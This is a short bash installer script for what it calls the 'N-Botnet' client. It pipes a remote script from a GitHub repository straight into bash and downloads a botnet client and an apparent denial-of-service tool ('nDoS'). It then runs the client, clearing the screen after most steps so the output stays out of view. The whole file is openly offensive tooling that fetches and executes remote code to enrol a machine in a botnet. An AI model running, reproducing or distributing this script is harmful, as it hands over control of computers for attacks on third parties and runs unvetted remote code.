#!/usr/bin/env bash
clear
apt update
apt install python3
bash <(curl -s https://raw.githubusercontent.com/anhnoine/N-Botnet/refs/heads/main/ndos.sh)
clear

echo "N-Botnet"

clear
echo "Installing Botnet Client"
wget https://raw.githubusercontent.com/anhnoine/N-Botnet/refs/heads/main/client/client.py
wget https://raw.githubusercontent.com/anhnoine/nDoS/refs/heads/main/tools/nDoS.mno
clear
pip install websockets
clear
python3 client.py
